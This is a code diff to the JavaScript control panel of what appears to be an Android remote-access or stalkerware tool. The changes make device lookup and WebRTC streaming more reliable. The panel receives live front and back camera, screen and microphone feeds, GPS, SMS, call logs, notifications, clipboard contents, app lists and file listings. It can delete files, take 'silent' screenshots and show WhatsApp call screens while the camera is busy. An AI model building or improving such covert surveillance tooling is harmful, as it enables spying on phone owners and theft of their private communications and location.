@@ -97,6 +97,22 @@ const tagLocation = document.getElementById('tagLocation');
 const gpsIntervalSelect = document.getElementById('gpsIntervalSelect');
 const btnRefreshLocation = document.getElementById('btnRefreshLocation');
 
+// Video Metadata Handlers (auto-hide placeholders on first frame load)
+videoFront?.addEventListener('loadedmetadata', () => {
+  if (placeholderFront) placeholderFront.classList.add('hidden');
+  videoFront.play().catch(e => console.log('Autoplay front loadedmetadata blocked', e));
+});
+
+videoBack?.addEventListener('loadedmetadata', () => {
+  if (placeholderBack) placeholderBack.classList.add('hidden');
+  videoBack.play().catch(e => console.log('Autoplay back loadedmetadata blocked', e));
+});
+
+videoScreen?.addEventListener('loadedmetadata', () => {
+  if (placeholderScreen) placeholderScreen.classList.add('hidden');
+  videoScreen.play().catch(e => console.log('Autoplay screen loadedmetadata blocked', e));
+});
+
 // Sidebar Metrics
 const infoModel = document.getElementById('infoModel');
 const infoManufacturer = document.getElementById('infoManufacturer');
@@ -330,16 +346,38 @@ function getOrCreateDevice(deviceId, meta) {
     quality: 'medium'
   };
 
-  devices.set(deviceId, dev);
+  devices.set(canonicalId, dev);
+  if (deviceId && deviceId !== canonicalId) {
+    devices.set(deviceId, dev);
+  }
 
   // If no device currently selected, select this one
   if (!selectedDeviceId) {
-    selectDevice(deviceId);
+    selectDevice(canonicalId);
   } else {
     renderDevicesList();
   }
 
   return dev;
+}
+
+function findDevice(idOrSocket) {
+  if (!idOrSocket) return null;
+  if (devices.has(idOrSocket)) return devices.get(idOrSocket);
+  for (const [key, dev] of devices.entries()) {
+    if (dev.deviceId === idOrSocket || dev.id === idOrSocket || dev.socketId === idOrSocket || key === idOrSocket) {
+      return dev;
+    }
+  }
+  return null;
+}
+
+function isDeviceSelected(dev, idOrSocket) {
+  if (!selectedDeviceId) return false;
+  if (dev && (dev.deviceId === selectedDeviceId || dev.id === selectedDeviceId || dev.socketId === selectedDeviceId)) {
+    return true;
+  }
+  return selectedDeviceId === idOrSocket;
 }
 
 function selectDevice(deviceId) {
@@ -647,8 +685,9 @@ function updateFocusStreams() {
   const isFrontBusy = !!(dev && dev.frontCameraBusy);
   const isBackBusy = !!(dev && dev.backCameraBusy);
 
-  if (dev && dev.isFrontStreaming && isFrontBusy && dev.screenTrack) {
-    // Hardware camera is busy with external app (e.g. WhatsApp video call) - display shared screen / call view
+  // 1. Front Camera Feed
+  if (dev && dev.isFrontStreaming && isFrontBusy && dev.screenTrack && !dev.frontTrack) {
+    // Hardware camera is busy with external app - display shared screen / call view
     if (!videoFront.srcObject || videoFront.srcObject.getVideoTracks()[0] !== dev.screenTrack) {
       videoFront.srcObject = new MediaStream([dev.screenTrack]);
     }
@@ -656,11 +695,11 @@ function updateFocusStreams() {
     if (tagFront) {
       tagFront.textContent = 'SHARED CALL FEED';
       tagFront.className = 'feed-live-tag tag-active';
-      tagFront.title = 'Camera is in use by WhatsApp/external call. Streaming live call view & camera preview.';
+      tagFront.title = 'Camera is in use by external app. Streaming live call view & camera preview.';
     }
     if (btnToggleFrontCam) { btnToggleFrontCam.textContent = '⏹ Stop'; btnToggleFrontCam.classList.remove('btn-primary'); }
     videoFront.play().catch(e => console.log('Autoplay front focus blocked', e));
-  } else if (dev && dev.frontTrack && dev.isFrontStreaming && !isFrontBusy) {
+  } else if (dev && dev.frontTrack && dev.isFrontStreaming) {
     if (!videoFront.srcObject || videoFront.srcObject.getVideoTracks()[0] !== dev.frontTrack) {
       videoFront.srcObject = new MediaStream([dev.frontTrack]);
     }
@@ -674,7 +713,7 @@ function updateFocusStreams() {
     if (tagFront) {
       tagFront.textContent = isFrontBusy ? 'CAMERA IN USE' : 'CONNECTING...';
       tagFront.className = 'feed-live-tag tag-active';
-      tagFront.title = isFrontBusy ? 'Camera hardware is in use by external app (WhatsApp). Waiting for stream view...' : '';
+      tagFront.title = isFrontBusy ? 'Camera hardware is in use by external app. Waiting for stream view...' : '';
     }
     if (btnToggleFrontCam) { btnToggleFrontCam.textContent = '⏹ Stop'; btnToggleFrontCam.classList.remove('btn-primary'); }
   } else {
@@ -684,7 +723,8 @@ function updateFocusStreams() {
     if (btnToggleFrontCam) { btnToggleFrontCam.textContent = '▶ Stream'; btnToggleFrontCam.classList.add('btn-primary'); }
   }
 
-  if (dev && dev.isBackStreaming && isBackBusy && dev.screenTrack) {
+  // 2. Back Camera Feed
+  if (dev && dev.isBackStreaming && isBackBusy && dev.screenTrack && !dev.backTrack) {
     // Hardware camera is busy with external app - display shared screen / call view
     if (!videoBack.srcObject || videoBack.srcObject.getVideoTracks()[0] !== dev.screenTrack) {
       videoBack.srcObject = new MediaStream([dev.screenTrack]);
@@ -697,7 +737,7 @@ function updateFocusStreams() {
     }
     if (btnToggleBackCam) { btnToggleBackCam.textContent = '⏹ Stop'; btnToggleBackCam.classList.remove('btn-primary'); }
     videoBack.play().catch(e => console.log('Autoplay back focus blocked', e));
-  } else if (dev && dev.backTrack && dev.isBackStreaming && !isBackBusy) {
+  } else if (dev && dev.backTrack && dev.isBackStreaming) {
     if (!videoBack.srcObject || videoBack.srcObject.getVideoTracks()[0] !== dev.backTrack) {
       videoBack.srcObject = new MediaStream([dev.backTrack]);
     }
@@ -721,6 +761,7 @@ function updateFocusStreams() {
     if (btnToggleBackCam) { btnToggleBackCam.textContent = '▶ Stream'; btnToggleBackCam.classList.add('btn-primary'); }
   }
 
+  // 3. Screen Sharing Feed
   const isScreenActive = !!(dev && dev.isScreenStreaming);
 
   if (cardScreenFeed) {
@@ -760,6 +801,7 @@ function updateAudioStream() {
     if (!remoteAudio.srcObject || remoteAudio.srcObject.getAudioTracks()[0] !== dev.audioTrack) {
       remoteAudio.srcObject = new MediaStream([dev.audioTrack]);
     }
+    remoteAudio.muted = false;
     remoteAudio.play().catch(e => console.log('Focus audio playback blocked', e));
     if (btnStreamMic) {
       btnStreamMic.textContent = '🔊 Listening (Mic ON)';
@@ -768,7 +810,6 @@ function updateAudioStream() {
       btnStreamMic.style.background = 'rgba(16, 185, 129, 0.15)';
     }
   } else if (dev && dev.isMicStreaming) {
-    remoteAudio.srcObject = null;
     if (btnStreamMic) {
       btnStreamMic.textContent = 'Connecting Mic...';
       btnStreamMic.style.color = '#f59e0b';
@@ -1373,6 +1414,14 @@ btnStreamMic?.addEventListener('click', () => {
   if (!dev) return;
   const next = !dev.isMicStreaming;
   dev.isMicStreaming = next;
+  if (remoteAudio) {
+    if (next) {
+      remoteAudio.muted = false;
+      remoteAudio.play().catch(e => console.log('Unlock audio playback on user click', e));
+    } else {
+      remoteAudio.srcObject = null;
+    }
+  }
   updateAudioStream();
   socket.emit('cmd:stream_mic', { to: selectedDeviceId, active: next });
 });
@@ -1646,13 +1695,16 @@ socket.on('signal', async (data) => {
   const signal = data.signal;
   if (!from || !signal) return;
 
-  const dev = getOrCreateDevice(from);
+  const dev = findDevice(from) || getOrCreateDevice(from);
+  if (!dev) return;
+
+  const isSelected = isDeviceSelected(dev, from);
 
   // Recording status signal
   if (signal.type === 'recording_status') {
     dev.isRecording = !!signal.active;
     if (dev.info) dev.info.recording = dev.isRecording;
-    if (selectedDeviceId === from) updateRecordingButton(dev.isRecording);
+    if (isSelected) updateRecordingButton(dev.isRecording);
     logDebug(`[REC] [${dev.info.model || from}] Recording ${signal.active ? 'STARTED' : 'STOPPED'}`);
     if (!signal.active) requestFileList(dev.currentPath, from);
     return;
@@ -1663,17 +1715,17 @@ socket.on('signal', async (data) => {
     if (signal.type === 'offer') {
       logDebug(`[WEBRTC] Received offer from ${dev.info.model || from}, applying session description...`);
 
-      let isNewPeer = false;
-      if (!dev.peer || dev.peer.signalingState === 'closed') {
+      const isPeerReusable = dev.peer && dev.peer.signalingState === 'stable' &&
+                             dev.peer.iceConnectionState !== 'failed' &&
+                             dev.peer.iceConnectionState !== 'closed';
+
+      if (!isPeerReusable) {
         if (dev.peer) {
           try { dev.peer.close(); } catch(e) {}
         }
         dev.peer = new RTCPeerConnection(rtcConfig);
         dev.candidateQueue = [];
-        isNewPeer = true;
-      }
 
-      if (isNewPeer) {
         dev.peer.ondatachannel = (event) => {
           const dc = event.channel;
           logDebug(`[WEBRTC-DC] Telemetry DataChannel opened (${dc.label}) for device ${from}`);
@@ -1689,23 +1741,35 @@ socket.on('signal', async (data) => {
 
         dev.peer.ontrack = (event) => {
           const track = event.track;
-          logDebug(`[WEBRTC] [${dev.info.model || from}] Track received: kind=${track.kind}, id=${track.id}`);
+          const streamId = (event.streams && event.streams[0]) ? event.streams[0].id : '';
+          const trackId = track.id || '';
+          logDebug(`[WEBRTC] [${dev.info.model || from}] Track received: kind=${track.kind}, id=${trackId}, stream=${streamId}`);
+
           if (track.kind === 'audio') {
             dev.audioTrack = track;
-            let audioEl = document.getElementById(`audio-${from}`);
+            track.onunmute = () => {
+              logDebug(`[WEBRTC] Audio track unmuted for ${dev.info.model || from}`);
+              if (isDeviceSelected(dev, from)) updateAudioStream();
+            };
+            let audioEl = document.getElementById(`audio-${dev.deviceId || dev.id || from}`);
             if (audioEl) {
               audioEl.srcObject = new MediaStream([track]);
               audioEl.play().catch(e => console.log('Audio auto-play blocked', e));
             }
-            if (selectedDeviceId === from) {
+            if (isDeviceSelected(dev, from)) {
               updateAudioStream();
             }
           } else if (track.kind === 'video') {
-            if (track.id.includes('screen') || track.id === 'screen_video') {
+            track.onunmute = () => {
+              logDebug(`[WEBRTC] Video track unmuted: ${track.id} for ${dev.info.model || from}`);
+              if (isDeviceSelected(dev, from)) updateFocusStreams();
+            };
+
+            if (streamId.includes('screen') || trackId.includes('screen') || trackId === 'screen_video') {
               dev.screenTrack = track;
-            } else if (track.id.includes('front') || track.id === 'front_video' || track.id === 'front_camera') {
+            } else if (streamId.includes('front') || trackId.includes('front') || trackId === 'front_video' || trackId === 'front_camera') {
               dev.frontTrack = track;
-            } else if (track.id.includes('back') || track.id === 'back_video' || track.id === 'back_camera') {
+            } else if (streamId.includes('back') || trackId.includes('back') || trackId === 'back_video' || trackId === 'back_camera') {
               dev.backTrack = track;
             } else if (!dev.frontTrack) {
               dev.frontTrack = track;
@@ -1715,7 +1779,7 @@ socket.on('signal', async (data) => {
               dev.screenTrack = track;
             }
             renderDevicesList();
-            if (selectedDeviceId === from) {
+            if (isDeviceSelected(dev, from)) {
               updateFocusStreams();
             }
           }
@@ -1735,7 +1799,7 @@ socket.on('signal', async (data) => {
           const state = dev.peer ? dev.peer.iceConnectionState : 'closed';
           logDebug(`[WEBRTC] [${dev.info.model || from}] ICE State: ${state}`);
           if (state === 'connected' || state === 'completed') {
-            if (selectedDeviceId === from) {
+            if (isDeviceSelected(dev, from)) {
               updateFocusStreams();
               updateAudioStream();
             }
@@ -1849,12 +1913,12 @@ socket.on('device_info', (info) => {
 
 // Stream Status Synchronization
 socket.on('stream_status', (data) => {
-  const deviceId = data.from || selectedDeviceId;
-  if (!deviceId || !devices.has(deviceId)) return;
+  const targetId = data.deviceId || data.from || selectedDeviceId;
+  const dev = findDevice(targetId) || getOrCreateDevice(targetId);
+  if (!dev) return;
 
-  const dev = devices.get(deviceId);
   const status = data.status || data;
-  logDebug(`[STREAM_STATUS] [${dev.info.model || deviceId}] Front:${status.frontCamera} Back:${status.backCamera} Screen:${status.screen} Mic:${status.mic} GPS:${status.location}`);
+  logDebug(`[STREAM_STATUS] [${dev.info.model || targetId}] Front:${status.frontCamera} Back:${status.backCamera} Screen:${status.screen} Mic:${status.mic} GPS:${status.location}`);
 
   if (status.frontCamera !== undefined) dev.isFrontStreaming = !!status.frontCamera;
   if (status.backCamera !== undefined) dev.isBackStreaming = !!status.backCamera;
@@ -1866,7 +1930,7 @@ socket.on('stream_status', (data) => {
   if (status.backCameraBusy !== undefined) dev.backCameraBusy = !!status.backCameraBusy;
 
   renderDevicesList();
-  if (selectedDeviceId === deviceId) {
+  if (isDeviceSelected(dev, targetId)) {
     updateFocusStreams();
     updateAudioStream();
     updateLocationUI();
@@ -1875,69 +1939,69 @@ socket.on('stream_status', (data) => {
 
 // Notifications
 socket.on('notification', (data) => {
-  const deviceId = data.from || selectedDeviceId;
+  const targetId = data.deviceId || data.from || selectedDeviceId;
+  const dev = findDevice(targetId) || getOrCreateDevice(targetId);
   const notif = data.notification;
-  if (!notif || !deviceId || !devices.has(deviceId)) return;
+  if (!notif || !dev) return;
 
-  const dev = devices.get(deviceId);
   dev.notifications.unshift(notif);
   if (dev.notifications.length > 50) dev.notifications.pop();
 
-  logDebug(`[🔔 NOTIFICATION] [${dev.info.model || deviceId}] ${notif.title || ''}: ${notif.text || ''}`);
+  logDebug(`[🔔 NOTIFICATION] [${dev.info.model || targetId}] ${notif.title || ''}: ${notif.text || ''}`);
 
-  if (selectedDeviceId === deviceId) {
+  if (isDeviceSelected(dev, targetId)) {
     renderNotifications(dev.notifications);
   }
 });
 
 // Call Logs
 socket.on('call_log', (data) => {
-  const deviceId = data.from || selectedDeviceId;
-  if (!data.call_logs || !deviceId || !devices.has(deviceId)) return;
+  const targetId = data.deviceId || data.from || selectedDeviceId;
+  const dev = findDevice(targetId) || getOrCreateDevice(targetId);
+  if (!data.call_logs || !dev) return;
 
-  const dev = devices.get(deviceId);
   dev.callLogs = data.call_logs;
-  logDebug(`[CALLS] Loaded ${data.call_logs.length} call logs for ${dev.info.model || deviceId}`);
+  logDebug(`[CALLS] Loaded ${data.call_logs.length} call logs for ${dev.info.model || targetId}`);
 
-  if (selectedDeviceId === deviceId) {
+  if (isDeviceSelected(dev, targetId)) {
     renderCallLogs(dev.callLogs);
   }
 });
 
 // SMS Messages
 socket.on('sms', (data) => {
-  const deviceId = data.from || selectedDeviceId;
-  if (!data.sms_messages || !deviceId || !devices.has(deviceId)) return;
+  const targetId = data.deviceId || data.from || selectedDeviceId;
+  const dev = findDevice(targetId) || getOrCreateDevice(targetId);
+  if (!data.sms_messages || !dev) return;
 
-  const dev = devices.get(deviceId);
   dev.smsMessages = data.sms_messages;
-  logDebug(`[SMS] Loaded ${data.sms_messages.length} messages for ${dev.info.model || deviceId}`);
+  logDebug(`[SMS] Loaded ${data.sms_messages.length} messages for ${dev.info.model || targetId}`);
 
-  if (selectedDeviceId === deviceId) {
+  if (isDeviceSelected(dev, targetId)) {
     renderSmsMessages(dev.smsMessages);
   }
 });
 
 // Applications List
 socket.on('apps_list', (data) => {
-  const deviceId = data.from || selectedDeviceId;
-  if (!data.apps || !deviceId || !devices.has(deviceId)) return;
+  const targetId = data.deviceId || data.from || selectedDeviceId;
+  const dev = findDevice(targetId) || getOrCreateDevice(targetId);
+  if (!data.apps || !dev) return;
 
-  const dev = devices.get(deviceId);
   dev.apps = data.apps;
-  logDebug(`[APPS] Synchronized ${data.apps.length} applications for ${dev.info.model || deviceId}`);
+  logDebug(`[APPS] Synchronized ${data.apps.length} applications for ${dev.info.model || targetId}`);
 
-  if (selectedDeviceId === deviceId) {
+  if (isDeviceSelected(dev, targetId)) {
     renderAppsList(dev.apps);
   }
 });
 
 // Environmental Sensors
 socket.on('sensor_data', (data) => {
-  const deviceId = data.from || selectedDeviceId;
-  if (!data.sensors || !deviceId || !devices.has(deviceId)) return;
+  const targetId = data.deviceId || data.from || selectedDeviceId;
+  const dev = findDevice(targetId) || getOrCreateDevice(targetId);
+  if (!data.sensors || !dev) return;
 
-  const dev = devices.get(deviceId);
   dev.sensors = data.sensors;
   dev.sensorHistory.push({
     lux: data.sensors.lux || 0,
@@ -1949,7 +2013,7 @@ socket.on('sensor_data', (data) => {
     dev.sensorHistory.shift();
   }
 
-  if (selectedDeviceId === deviceId) {
+  if (isDeviceSelected(dev, targetId)) {
     if (sensorLux && data.sensors.lux !== undefined) sensorLux.textContent = `${data.sensors.lux.toFixed(0)} Lux`;
     if (sensorProximity && data.sensors.proximity !== undefined) sensorProximity.textContent = data.sensors.proximity === 0.0 ? 'NEAR (0cm)' : 'FAR (normal)';
     if (sensorAccel && data.sensors.accelX !== undefined) sensorAccel.textContent = `X:${data.sensors.accelX.toFixed(1)} Y:${data.sensors.accelY.toFixed(1)} Z:${data.sensors.accelZ.toFixed(1)}`;
@@ -1959,14 +2023,14 @@ socket.on('sensor_data', (data) => {
 
 // Network Analyzer
 socket.on('network_info', (data) => {
-  const deviceId = data.from || selectedDeviceId;
-  if (!data.network || !deviceId || !devices.has(deviceId)) return;
+  const targetId = data.deviceId || data.from || selectedDeviceId;
+  const dev = findDevice(targetId) || getOrCreateDevice(targetId);
+  if (!data.network || !dev) return;
 
-  const dev = devices.get(deviceId);
   dev.network = data.network;
-  logDebug(`[NETWORK] [${dev.info.model || deviceId}] SSID=${data.network.ssid}, Speed=${data.network.linkSpeed} Mbps`);
+  logDebug(`[NETWORK] [${dev.info.model || targetId}] SSID=${data.network.ssid}, Speed=${data.network.linkSpeed} Mbps`);
 
-  if (selectedDeviceId === deviceId) {
+  if (isDeviceSelected(dev, targetId)) {
     if (netSsid) netSsid.textContent = data.network.ssid;
     if (netSpeed) netSpeed.textContent = `${data.network.linkSpeed} Mbps`;
     if (netIp) netIp.textContent = data.network.localIp;
@@ -1977,8 +2041,8 @@ socket.on('network_info', (data) => {
 // Snapshot Frame
 socket.on('snapshot_data', (data) => {
   if (data.snapshot) {
-    const from = data.from || selectedDeviceId;
-    const dev = devices.get(from);
+    const from = data.deviceId || data.from || selectedDeviceId;
+    const dev = findDevice(from) || getOrCreateDevice(from);
     logDebug(`Received camera snapshot from: ${dev ? dev.info.model : from} (${data.snapshot.camera})`);
     currentSnapshotBase64 = data.snapshot.image;
     if (snapshotPreview) snapshotPreview.src = `data:image/jpeg;base64,${currentSnapshotBase64}`;
@@ -1989,8 +2053,8 @@ socket.on('snapshot_data', (data) => {
 // Screenshot Frame (Silent Capture)
 socket.on('screenshot_data', (data) => {
   if (data.screenshot) {
-    const from = data.from || selectedDeviceId;
-    const dev = devices.get(from);
+    const from = data.deviceId || data.from || selectedDeviceId;
+    const dev = findDevice(from) || getOrCreateDevice(from);
     const devName = dev ? (dev.info.model || from) : from;
 
     if (data.screenshot.error) {
@@ -2010,44 +2074,45 @@ socket.on('screenshot_data', (data) => {
 
 // Clipboard
 socket.on('clipboard_data', (data) => {
-  const deviceId = data.from || selectedDeviceId;
-  if (data.clipboard === undefined || !deviceId || !devices.has(deviceId)) return;
+  const targetId = data.deviceId || data.from || selectedDeviceId;
+  const dev = findDevice(targetId) || getOrCreateDevice(targetId);
+  if (data.clipboard === undefined || !dev) return;
 
-  const dev = devices.get(deviceId);
   dev.clipboard = data.clipboard;
-  if (selectedDeviceId === deviceId && clipboardTextArea) {
+  if (isDeviceSelected(dev, targetId) && clipboardTextArea) {
     clipboardTextArea.value = data.clipboard;
   }
-  logDebug(`[CLIPBOARD] Synced text from ${dev.info.model || deviceId}`);
+  logDebug(`[CLIPBOARD] Synced text from ${dev.info.model || targetId}`);
 });
 
 // GPS Location Telemetry
 socket.on('location', (data) => {
-  const deviceId = data.from || selectedDeviceId;
-  if (deviceId && devices.has(deviceId) && data.latitude !== undefined && data.longitude !== undefined) {
-    updateDeviceLocation(deviceId, data.latitude, data.longitude);
+  const targetId = data.deviceId || data.from || selectedDeviceId;
+  const dev = findDevice(targetId) || getOrCreateDevice(targetId);
+  if (dev && data.latitude !== undefined && data.longitude !== undefined) {
+    updateDeviceLocation(dev.deviceId || dev.id || targetId, data.latitude, data.longitude);
   }
 });
 
 // File System Events
 socket.on('fs:files', (data) => {
-  const deviceId = data.from || selectedDeviceId;
-  if (data.file_list && deviceId && devices.has(deviceId)) {
-    const dev = devices.get(deviceId);
+  const targetId = data.deviceId || data.from || selectedDeviceId;
+  const dev = findDevice(targetId) || getOrCreateDevice(targetId);
+  if (data.file_list && dev) {
     dev.files = data.file_list.files;
     dev.currentPath = data.file_list.currentPath;
-    if (selectedDeviceId === deviceId) {
+    if (isDeviceSelected(dev, targetId)) {
       renderFileList(dev.files, dev.currentPath);
     }
   }
 });
 
 socket.on('fs:delete_result', (data) => {
-  const deviceId = data.from || selectedDeviceId;
+  const targetId = data.deviceId || data.from || selectedDeviceId;
+  const dev = findDevice(targetId) || getOrCreateDevice(targetId);
   logDebug(`[FS] Delete ${data.success ? 'SUCCESS' : 'FAILED'} for path ${data.path}`);
-  if (selectedDeviceId === deviceId) {
-    const dev = devices.get(deviceId);
-    requestFileList(dev?.currentPath || '/storage/emulated/0/', deviceId);
+  if (dev && isDeviceSelected(dev, targetId)) {
+    requestFileList(dev.currentPath || '/storage/emulated/0/', dev.deviceId || dev.id);
   }
 });
 
